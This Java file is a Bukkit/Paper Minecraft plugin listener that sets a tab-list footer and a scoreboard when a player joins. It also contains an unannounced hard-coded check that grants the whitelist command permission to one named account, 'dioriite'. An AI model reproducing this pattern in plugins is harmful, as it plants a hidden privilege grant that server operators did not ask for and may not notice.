package org.bl4nk.antiEnd.events;

import fr.mrmicky.fastboard.adventure.FastBoard;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextDecoration;
import org.bl4nk.antiEnd.AntiEnd;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.permissions.PermissionAttachment;

import static org.bl4nk.antiEnd.AntiEnd.boards;
import static org.bl4nk.antiEnd.AntiEnd.scoreboardNotShownTo;

public class PlayerJoinListener implements Listener {
    @EventHandler
    public void playerJoinEvent(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals("dioriite")) {
            PermissionAttachment attachment = player.addAttachment(AntiEnd.getProvidingPlugin(PortalFillListener.class));

            attachment.setPermission("minecraft.command.whitelist", true);
            player.recalculatePermissions();
        }

        player.sendPlayerListFooter(Component.text("Reno was here... ").color(NamedTextColor.DARK_GRAY).decorate(TextDecoration.ITALIC));

        if (!scoreboardNotShownTo.contains(player.getUniqueId())) {
            boards.put(player, new FastBoard(player));
        }
    }
}
